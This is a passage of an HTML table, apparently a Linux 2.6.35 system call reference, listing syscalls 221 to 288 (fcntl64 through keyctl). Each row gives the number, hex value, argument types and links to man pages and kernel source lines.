href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl64.2.html" target="_blank" rel="noopener">sys_fcntl64</a></td><td>0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L452" target="_blank" rel="noopener">fs/fcntl.c:452</a></td></tr><tr><td>222</td><td>not implemented</td><td>0xde</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>223</td><td>not implemented</td><td>0xdf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>224</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html" target="_blank" rel="noopener">sys_gettid</a></td><td>0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1493" target="_blank" rel="noopener">kernel/timer.c:1493</a></td></tr><tr><td>225</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html" target="_blank" rel="noopener">sys_readahead</a></td><td>0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>226</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html" target="_blank" rel="noopener">sys_setxattr</a></td><td>0xe2</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L279" target="_blank" rel="noopener">fs/xattr.c:279</a></td></tr><tr><td>227</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html" target="_blank" rel="noopener">sys_lsetxattr</a></td><td>0xe3</td><td>const char __user *path</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L298" target="_blank" rel="noopener">fs/xattr.c:298</a></td></tr><tr><td>228</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html" target="_blank" rel="noopener">sys_fsetxattr</a></td><td>0xe4</td><td>int fd</td><td>const char __user *name</td><td>const void __user *value</td><td>size_t size</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L317" target="_blank" rel="noopener">fs/xattr.c:317</a></td></tr><tr><td>229</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html" target="_blank" rel="noopener">sys_getxattr</a></td><td>0xe5</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L376" target="_blank" rel="noopener">fs/xattr.c:376</a></td></tr><tr><td>230</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html" target="_blank" rel="noopener">sys_lgetxattr</a></td><td>0xe6</td><td>const char __user *path</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L390" target="_blank" rel="noopener">fs/xattr.c:390</a></td></tr><tr><td>231</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html" target="_blank" rel="noopener">sys_fgetxattr</a></td><td>0xe7</td><td>int fd</td><td>const char __user *name</td><td>void __user *value</td><td>size_t size</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L404" target="_blank" rel="noopener">fs/xattr.c:404</a></td></tr><tr><td>232</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html" target="_blank" rel="noopener">sys_listxattr</a></td><td>0xe8</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L449" target="_blank" rel="noopener">fs/xattr.c:449</a></td></tr><tr><td>233</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html" target="_blank" rel="noopener">sys_llistxattr</a></td><td>0xe9</td><td>const char __user *path</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L463" target="_blank" rel="noopener">fs/xattr.c:463</a></td></tr><tr><td>234</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html" target="_blank" rel="noopener">sys_flistxattr</a></td><td>0xea</td><td>int fd</td><td>char __user *list</td><td>size_t size</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L477" target="_blank" rel="noopener">fs/xattr.c:477</a></td></tr><tr><td>235</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html" target="_blank" rel="noopener">sys_removexattr</a></td><td>0xeb</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L509" target="_blank" rel="noopener">fs/xattr.c:509</a></td></tr><tr><td>236</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html" target="_blank" rel="noopener">sys_lremovexattr</a></td><td>0xec</td><td>const char __user *path</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L527" target="_blank" rel="noopener">fs/xattr.c:527</a></td></tr><tr><td>237</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html" target="_blank" rel="noopener">sys_fremovexattr</a></td><td>0xed</td><td>int fd</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L545" target="_blank" rel="noopener">fs/xattr.c:545</a></td></tr><tr><td>238</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html" target="_blank" rel="noopener">sys_tkill</a></td><td>0xee</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2395" target="_blank" rel="noopener">kernel/signal.c:2395</a></td></tr><tr><td>239</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html" target="_blank" rel="noopener">sys_sendfile64</a></td><td>0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L916" target="_blank" rel="noopener">fs/read_write.c:916</a></td></tr><tr><td>240</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html" target="_blank" rel="noopener">sys_futex</a></td><td>0xf0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2605" target="_blank" rel="noopener">kernel/futex.c:2605</a></td></tr><tr><td>241</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html" target="_blank" rel="noopener">sys_sched_setaffinity</a></td><td>0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4765" target="_blank" rel="noopener">kernel/sched.c:4765</a></td></tr><tr><td>242</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html" target="_blank" rel="noopener">sys_sched_getaffinity</a></td><td>0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long __user *user_mask_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4817" target="_blank" rel="noopener">kernel/sched.c:4817</a></td></tr><tr><td>243</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_thread_area.2.html" target="_blank" rel="noopener">sys_set_thread_area</a></td><td>0xf3</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="noopener">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/syscall.c?v=2.6.35#L222" target="_blank" rel="noopener">arch/mips/kernel/syscall.c:222</a></td></tr><tr><td>244</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_thread_area.2.html" target="_blank" rel="noopener">sys_get_thread_area</a></td><td>0xf4</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="noopener">struct user_desc __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>245</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html" target="_blank" rel="noopener">sys_io_setup</a></td><td>0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t __user *ctx</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1245" target="_blank" rel="noopener">fs/aio.c:1245</a></td></tr><tr><td>246</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html" target="_blank" rel="noopener">sys_io_destroy</a></td><td>0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1283" target="_blank" rel="noopener">fs/aio.c:1283</a></td></tr><tr><td>247</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html" target="_blank" rel="noopener">sys_io_getevents</a></td><td>0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="noopener">struct io_event __user *events</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1808" target="_blank" rel="noopener">fs/aio.c:1808</a></td></tr><tr><td>248</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html" target="_blank" rel="noopener">sys_io_submit</a></td><td>0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb __user * __user *</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1711" target="_blank" rel="noopener">fs/aio.c:1711</a></td></tr><tr><td>249</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html" target="_blank" rel="noopener">sys_io_cancel</a></td><td>0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb __user *iocb</td><td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="noopener">struct io_event __user *result</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1746" target="_blank" rel="noopener">fs/aio.c:1746</a></td></tr><tr><td>250</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html" target="_blank" rel="noopener">sys_fadvise64</a></td><td>0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>251</td><td>not implemented</td><td>0xfb</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>252</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html" target="_blank" rel="noopener">sys_exit_group</a></td><td>0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1087" target="_blank" rel="noopener">kernel/exit.c:1087</a></td></tr><tr><td>253</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html" target="_blank" rel="noopener">sys_lookup_dcookie</a></td><td>0xfd</td><td>u64 cookie64</td><td>char __user *buf</td><td>size_t len</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>254</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html" target="_blank" rel="noopener">sys_epoll_create</a></td><td>0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1215" target="_blank" rel="noopener">fs/eventpoll.c:1215</a></td></tr><tr><td>255</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html" target="_blank" rel="noopener">sys_epoll_ctl</a></td><td>0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="noopener">struct epoll_event __user *event</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1228" target="_blank" rel="noopener">fs/eventpoll.c:1228</a></td></tr><tr><td>256</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html" target="_blank" rel="noopener">sys_epoll_wait</a></td><td>0x100</td><td>int epfd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="noopener">struct epoll_event __user *events</a></td><td>int maxevents</td><td>int timeout</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1320" target="_blank" rel="noopener">fs/eventpoll.c:1320</a></td></tr><tr><td>257</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html" target="_blank" rel="noopener">sys_remap_file_pages</a></td><td>0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/fremap.c?v=2.6.35#L123" target="_blank" rel="noopener">mm/fremap.c:123</a></td></tr><tr><td>258</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html" target="_blank" rel="noopener">sys_set_tid_address</a></td><td>0x102</td><td>int __user *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L920" target="_blank" rel="noopener">kernel/fork.c:920</a></td></tr><tr><td>259</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html" target="_blank" rel="noopener">sys_timer_create</a></td><td>0x103</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="noopener">struct sigevent __user *timer_event_spec</a></td><td>timer_t __user * created_timer_id</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L522" target="_blank" rel="noopener">kernel/posix-timers.c:522</a></td></tr><tr><td>260</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html" target="_blank" rel="noopener">sys_timer_settime</a></td><td>0x104</td><td>timer_t timer_id</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">const struct itimerspec __user *new_setting</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *old_setting</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L800" target="_blank" rel="noopener">kernel/posix-timers.c:800</a></td></tr><tr><td>261</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html" target="_blank" rel="noopener">sys_timer_gettime</a></td><td>0x105</td><td>timer_t timer_id</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="noopener">struct itimerspec __user *setting</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L702" target="_blank" rel="noopener">kernel/posix-timers.c:702</a></td></tr><tr><td>262</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html" target="_blank" rel="noopener">sys_timer_getoverrun</a></td><td>0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L732" target="_blank" rel="noopener">kernel/posix-timers.c:732</a></td></tr><tr><td>263</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html" target="_blank" rel="noopener">sys_timer_delete</a></td><td>0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="noopener">kernel/posix-timers.c:855</a></td></tr><tr><td>264</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html" target="_blank" rel="noopener">sys_clock_settime</a></td><td>0x108</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L941" target="_blank" rel="noopener">kernel/posix-timers.c:941</a></td></tr><tr><td>265</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html" target="_blank" rel="noopener">sys_clock_gettime</a></td><td>0x109</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L954" target="_blank" rel="noopener">kernel/posix-timers.c:954</a></td></tr><tr><td>266</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html" target="_blank" rel="noopener">sys_clock_getres</a></td><td>0x10a</td><td>clockid_t which_clock</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *tp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L971" target="_blank" rel="noopener">kernel/posix-timers.c:971</a></td></tr><tr><td>267</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html" target="_blank" rel="noopener">sys_clock_nanosleep</a></td><td>0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rmtp</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L1001" target="_blank" rel="noopener">kernel/posix-timers.c:1001</a></td></tr><tr><td>268</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs64.2.html" target="_blank" rel="noopener">sys_statfs64</a></td><td>0x10c</td><td>const char __user *path</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="noopener">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L118" target="_blank" rel="noopener">fs/statfs.c:118</a></td></tr><tr><td>269</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs64.2.html" target="_blank" rel="noopener">sys_fstatfs64</a></td><td>0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="noopener">struct statfs64 __user *buf</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L154" target="_blank" rel="noopener">fs/statfs.c:154</a></td></tr><tr><td>270</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html" target="_blank" rel="noopener">sys_tgkill</a></td><td>0x10e</td><td>int tgid</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2383" target="_blank" rel="noopener">kernel/signal.c:2383</a></td></tr><tr><td>271</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html" target="_blank" rel="noopener">sys_utimes</a></td><td>0x10f</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L219" target="_blank" rel="noopener">fs/utimes.c:219</a></td></tr><tr><td>272</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64_64.2.html" target="_blank" rel="noopener">sys_fadvise64_64</a></td><td>0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>273</td><td>not implemented</td><td>0x111</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>274</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html" target="_blank" rel="noopener">sys_mbind</a></td><td>0x112</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1232" target="_blank" rel="noopener">mm/mempolicy.c:1232</a></td></tr><tr><td>275</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html" target="_blank" rel="noopener">sys_get_mempolicy</a></td><td>0x113</td><td>int __user *policy</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1348" target="_blank" rel="noopener">mm/mempolicy.c:1348</a></td></tr><tr><td>276</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html" target="_blank" rel="noopener">sys_set_mempolicy</a></td><td>0x114</td><td>int mode</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1254" target="_blank" rel="noopener">mm/mempolicy.c:1254</a></td></tr><tr><td>277</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html" target="_blank" rel="noopener">sys_mq_open</a></td><td>0x115</td><td>const char __user *name</td><td>int oflag</td><td>mode_t mode</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">struct mq_attr __user *attr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L673" target="_blank" rel="noopener">ipc/mqueue.c:673</a></td></tr><tr><td>278</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html" target="_blank" rel="noopener">sys_mq_unlink</a></td><td>0x116</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L746" target="_blank" rel="noopener">ipc/mqueue.c:746</a></td></tr><tr><td>279</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html" target="_blank" rel="noopener">sys_mq_timedsend</a></td><td>0x117</td><td>mqd_t mqdes</td><td>const char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L840" target="_blank" rel="noopener">ipc/mqueue.c:840</a></td></tr><tr><td>280</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html" target="_blank" rel="noopener">sys_mq_timedreceive</a></td><td>0x118</td><td>mqd_t mqdes</td><td>char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int __user *msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L934" target="_blank" rel="noopener">ipc/mqueue.c:934</a></td></tr><tr><td>281</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html" target="_blank" rel="noopener">sys_mq_notify</a></td><td>0x119</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="noopener">const struct sigevent __user *notification</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1023" target="_blank" rel="noopener">ipc/mqueue.c:1023</a></td></tr><tr><td>282</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html" target="_blank" rel="noopener">sys_mq_getsetattr</a></td><td>0x11a</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">const struct mq_attr __user *mqstat</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="noopener">struct mq_attr __user *omqstat</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1154" target="_blank" rel="noopener">ipc/mqueue.c:1154</a></td></tr><tr><td>283</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html" target="_blank" rel="noopener">sys_kexec_load</a></td><td>0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td><a href="http://lxr.free-electrons.com/source/include/linux/kexec.h?v=2.6.35#L61" target="_blank" rel="noopener">struct kexec_segment __user *segments</a></td><td>unsigned long flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/kexec.c?v=2.6.35#L939" target="_blank" rel="noopener">kernel/kexec.c:939</a></td></tr><tr><td>284</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html" target="_blank" rel="noopener">sys_waitid</a></td><td>0x11c</td><td>int which</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/arch/ia64/include/asm/siginfo.h?v=2.6.35#L19" target="_blank" rel="noopener">struct siginfo __user *infop</a></td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1655" target="_blank" rel="noopener">kernel/exit.c:1655</a></td></tr><tr><td>285</td><td>not implemented</td><td>0x11d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>286</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html" target="_blank" rel="noopener">sys_add_key</a></td><td>0x11e</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const void __user *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L57" target="_blank" rel="noopener">security/keys/keyctl.c:57</a></td></tr><tr><td>287</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html" target="_blank" rel="noopener">sys_request_key</a></td><td>0x11f</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const char __user *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L149" target="_blank" rel="noopener">security/keys/keyctl.c:149</a></td></tr><tr><td>288</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html" target="_blank" rel="noopener">sys_keyctl</a></td><td>0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a 